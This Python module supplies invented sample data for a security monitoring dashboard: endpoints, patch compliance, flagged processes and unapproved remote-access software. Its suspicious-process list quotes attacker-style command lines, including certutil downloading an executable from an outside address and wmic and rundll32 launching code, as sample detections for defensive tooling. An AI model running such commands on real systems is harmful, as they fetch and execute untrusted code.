"""Sample data for the dashboard.

Everything here is made up. It lets us build and test the dashboard before
any real endpoints (VMs, containers) are sending data. Later, these lists
will be replaced by data the collector agents send to the backend.
"""

from datetime import datetime, timedelta, timezone

NOW = datetime.now(timezone.utc)


def _ago(minutes: int) -> str:
    """Return an ISO timestamp for `minutes` ago."""
    return (NOW - timedelta(minutes=minutes)).isoformat(timespec="seconds")


# One entry per machine in our pretend company.
ENDPOINTS = [
    {"hostname": "WKS-034", "department": "IT", "os": "Windows 11", "online": True, "av_enabled": True, "missing_critical": 0},
    {"hostname": "WKS-042", "department": "Sales", "os": "Windows 11", "online": True, "av_enabled": True, "missing_critical": 2},
    {"hostname": "WKS-056", "department": "HR", "os": "Windows 11", "online": True, "av_enabled": False, "missing_critical": 1},
    {"hostname": "WKS-089", "department": "Finance", "os": "Windows 11", "online": False, "av_enabled": True, "missing_critical": 3},
    {"hostname": "WKS-091", "department": "Finance", "os": "Windows 11", "online": True, "av_enabled": True, "missing_critical": 0},
    {"hostname": "WKS-127", "department": "Marketing", "os": "Windows 11", "online": True, "av_enabled": True, "missing_critical": 0},
    {"hostname": "SRV-DC1", "department": "IT", "os": "Windows Server 2022", "online": True, "av_enabled": True, "missing_critical": 0},
    {"hostname": "SRV-WEB1", "department": "IT", "os": "Ubuntu 24.04", "online": True, "av_enabled": False, "missing_critical": 1},
    {"hostname": "LNX-DEV-01", "department": "Engineering", "os": "Ubuntu 24.04", "online": True, "av_enabled": True, "missing_critical": 0},
    {"hostname": "LNX-DEV-02", "department": "Engineering", "os": "Ubuntu 24.04", "online": False, "av_enabled": True, "missing_critical": 0},
]

# Percent of each patch category installed across all endpoints.
PATCH_COMPLIANCE = {"critical": 87, "security": 92, "optional": 45}

# Command lines that look like common attacker techniques ("living off the land").
SUSPICIOUS_PROCESSES = [
    {"time": _ago(35), "hostname": "WKS-042", "process": "powershell.exe", "command_line": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi...", "reason": "Encoded PowerShell command"},
    {"time": _ago(100), "hostname": "SRV-WEB1", "process": "certutil.exe", "command_line": "certutil.exe -urlcache -f http://203.0.113.7/a.exe a.exe", "reason": "certutil used to download a file"},
    {"time": _ago(193), "hostname": "WKS-089", "process": "wmic.exe", "command_line": "wmic.exe process call create \"cmd /c whoami\"", "reason": "WMI used to start a process"},
    {"time": _ago(268), "hostname": "WKS-127", "process": "rundll32.exe", "command_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"", "reason": "rundll32 running script code"},
]

# Software installs that are not on the approved list.
UNAUTHORIZED_SOFTWARE = [
    {"software": "TeamViewer", "hostname": "WKS-056", "department": "HR", "severity": "medium"},
    {"software": "AnyDesk", "hostname": "WKS-091", "department": "Finance", "severity": "medium"},
    {"software": "Tor Browser", "hostname": "WKS-034", "department": "IT", "severity": "high"},
]
